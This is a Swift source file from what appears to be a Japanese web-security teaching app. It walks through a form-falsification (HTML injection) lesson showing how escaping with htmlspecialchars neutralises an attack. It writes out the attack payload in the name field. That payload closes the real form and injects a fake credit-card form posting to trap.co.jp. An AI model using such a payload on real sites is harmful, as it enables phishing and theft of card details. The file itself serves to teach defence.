import UIKit

class FalsifyFormSafeWebSimulatorViewController: WebSimulatorViewController {
    
    let trapA = A()
    let titleH1 = H1()
    let nameLabel = Text()
    let nameInput = Input()
    let addressLabel = Text()
    let addressInput = Input()
    let telLabel = Text()
    let telInput = Input()
    let itemLabel = Text()
    let itemInput = Input()
    let numLabel = Text()
    let numInput = Input()
    let applyButton = Button()
    
    override func viewDidLoad() {
        super.viewDidLoad()
        setupViews()
    }
    
    override func viewDidAppear(_ animated: Bool) {
        super.viewDidAppear(animated)
        showTrap()
    }
    
    private func setupViews() {
        trapA.set(text: "脆弱市の粗大ゴミ回収費用がクレジットカードで支払えるようになりました!!これは便利です!!")
        trapA.set(code: "<input\n style=\"cursor:pointer;text-decoration:underline;color:blue;border:none;background:transparent;font-size:100%;\"\n type=\"submit\"\n value=\"脆弱市の粗大ゴミ改修費用がクレジットカードで支払えるようになりました!!これは便利です!!\"\n>", language: .html)
        trapA.button.addTarget(self, action: #selector(handleDisabledButton(_:)), for: .touchUpInside)
        titleH1.set(text: "安全市 粗大ゴミ申し込みページ")
        nameLabel.set(text: "名前:")
        nameInput.textField.text = """
    "></form>    <form method="post" action="http://www.trap.co.jp/send_mail.php" style="top:5px;left:5px;position:absolute;background-color:white;">        <h1>脆弱市の粗大ゴミ回収費用がクレジットカードでお支払い頂けるようになりました。</h1><br>        カード名義: <input type="text" name="name"><br><br>        カード番号: <input type="text" name="card_number"><br><br>        有効期限: <input type="text" name="expiration_date"><br><br>        <input type="submit" value="申し込む">    </form>    <!--
"""
        nameInput.set(code: """
<input type="text" name="name" value="<?php echo htmlspecialchars($_POST["name"], ENT_QUOTES); ?>">
""", language: .php, force: false)
        addressLabel.set(text: "住所:")
        telLabel.set(text: "電話番号:")
        itemLabel.set(text: "品目:")
        numLabel.set(text: "数量:")
        applyButton.set(text: "申し込む")
    }
    
    private func showTrap() {
        body.clear()
        body.append(element: trapA)
        clearGuideSections()
        appendGuideSection([
            GuideText(text: "これが攻撃者が用意した罠サイトです。"),
            ])
        appendGuideSection([
            GuideText(text: "この赤枠で囲まれたボタンをタップすると、攻撃用の値がPOSTリクエストのnameパラメータに設定されて送信されます。"),
            GuideText(text: "このボタンは<a>要素のように見えていますが実際には<input>要素です。\n詳しくは体験編のレッスンを参照してください。", programingLanguages: [.html])
            ], onEnter: { completion in
                self.focus(on: self.trapA) {
                    completion?()
                }
        }, onExit: { completion in
            self.unfocus(elementView: self.trapA) {
                completion?()
            }
        })
        appendGuideSection([
            GuideText(text: "それでは実際にこのボタンをタップして、遷移先のページに移動してみましょう。")
            ], onEnter: { completion in
                self.trapA.button.removeTarget(self, action: #selector(self.handleDisabledButton(_:)), for: .touchUpInside)
                self.trapA.button.addTarget(self, action: #selector(self.handleTrapA(_:)), for: .touchUpInside)
                completion?()
        })
        removeCloseButton()
        guideMessageCollectionView.reloadData()
        guideMessageCollectionView.scrollToItem(at: IndexPath(item: 0, section: 0), at: .left, animated: false)
        showGuideMessageCollectionView()
    }
    
    private func showApply() {
        body.clear()
        body.append(element: titleH1)
        body.append(element: nameLabel)
        body.append(element: nameInput)
        body.appendBreak()
        body.appendBreak()
        body.append(element: addressLabel)
        body.append(element: addressInput)
        body.appendBreak()
        body.appendBreak()
        body.append(element: telLabel)
        body.append(element: telInput)
        body.appendBreak()
        body.appendBreak()
        body.append(element: itemLabel)
        body.append(element: itemInput)
        body.appendBreak()
        body.appendBreak()
        body.append(element: numLabel)
        body.append(element: numInput)
        body.appendBreak()
        body.appendBreak()
        body.append(element: applyButton)
        clearGuideSections()
        appendGuideSection([
            GuideText(text: "これが遷移先のWebページです。")
            ])
        appendGuideSection([
            GuideText(text: "赤枠で囲まれた部分に注目してください。"),
            GuideText(text: "特殊文字をエスケープした結果、攻撃者が埋め込もうとしていたコードがそのまま<input>要素のvalue属性に設定されたことがわかります。", programingLanguages: [.html]),
            GuideText(text: """
以下に特殊文字をエスケープした後のこの<input>要素のコードを示します。
見切れている部分はスクロールすることで最後まで確認することができます。
<input type="text" name="name" value="&quot;&gt;&lt;/form&gt;
    &lt;form method=&quot;post&quot; action=&quot;send_mail.php&quot; style=&quot;top:5px;left:5px;position:absolute;background-color:white;&quot;&gt;
        &lt;h1&gt;脆弱市の粗大ゴミ回収費用がクレジットカードでお支払い頂けるようになりました。&lt;/h1&gt;&lt;br&gt;
        カード名義: &lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;&lt;br&gt;&lt;br&gt;
        カード番号: &lt;input type=&quot;text&quot; name=&quot;card_number&quot;&gt;&lt;br&gt;&lt;br&gt;
        有効期限: &lt;input type=&quot;text&quot; name=&quot;expiration_date&quot;&gt;&lt;br&gt;&lt;br&gt;
        &lt;input type=&quot;submit&quot; value=&quot;申し込む&quot;&gt;
    &lt;/form&gt;
    &lt;!--">
""", programingLanguages: [.html]),
            GuideText(text: "このように特殊文字のエスケープを行うことによって元々あった<form>要素を終了させられることもなく、新たに<form>要素を挿入されることもありません。", programingLanguages: [.html]),
            GuideText(text: "体験編で見たように特殊文字のエスケープを行なっていないとコードを直接埋め込むことが可能になってしまうため、ユーザから受け取った値を使用する場合には必ず特殊文字のエスケープを行うようにしましょう。")
            ], onEnter: { completion in
                self.focus(on: self.nameInput) {
                    completion?()
                }
        }, onExit: { completion in
            self.unfocus(elementView: self.nameInput) {
                completion?()
            }
        })
        appendGuideSection([
            GuideText(text: "今回のレッスンはこれで終了です。\n他にも様々なレッスンを用意していますのでそちらも参考にしてみてください。\nお疲れ様でした。")
            ])
        addCloseButton()
        guideMessageCollectionView.reloadData()
        guideMessageCollectionView.scrollToItem(at: IndexPath(item: 0, section: 0), at: .left, animated: false)
        showGuideMessageCollectionView()
    }
    
    @objc
    private func handleTrapA(_ sender: A) {
        hideGuideMessageCollectionView() {
            self.unfocusAll() {
                self.showApply()
            }
        }
    }
    
}
